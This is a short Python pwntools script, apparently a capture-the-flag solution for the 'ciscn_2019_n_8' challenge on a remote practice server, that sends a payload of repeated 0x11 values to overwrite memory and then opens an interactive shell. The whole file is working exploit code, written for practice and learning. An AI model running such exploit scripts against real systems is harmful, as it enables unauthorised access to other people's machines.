#coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
# sh = process("./ciscn_2019_n_8")
sh = remote("node3.buuoj.cn",29911)
payload = p32(0x11)*14
sh.sendline(payload)
sh.interactive()